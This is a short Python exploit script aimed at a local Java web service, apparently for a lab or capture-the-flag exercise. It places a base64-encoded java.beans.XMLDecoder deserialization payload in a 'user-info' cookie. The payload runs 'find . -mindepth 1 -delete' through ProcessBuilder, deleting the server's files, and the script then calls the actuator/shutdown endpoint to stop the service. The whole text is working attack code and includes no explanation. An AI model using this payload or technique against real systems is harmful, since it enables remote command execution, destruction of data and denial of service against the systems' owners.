#!/usr/bin/python
import requests
import base64

URL: str = "http://localhost:8888/"

PAYLOAD: str = """
<?xml version="1.0" encoding="UTF-8"?>
<java version="17.0.9" class="java.beans.XMLDecoder">
    <object class="java.lang.ProcessBuilder">
        <array class="java.lang.String" length="5">
            <void index="0">
                <string>find</string>
            </void>
            <void index="1">
                <string>.</string>
            </void>
            <void index="2">
                <string>-mindepth</string>
            </void>
            <void index="3">
                <string>1</string>
            </void>
            <void index="4">
                <string>-delete</string>
            </void>
        </array>
        <void method="start"></void>
    </object>
</java>
"""

requests.get(URL, cookies={
    'user-info': base64.b64encode(PAYLOAD.strip().encode()).decode()
})

requests.post(URL + 'actuator/shutdown')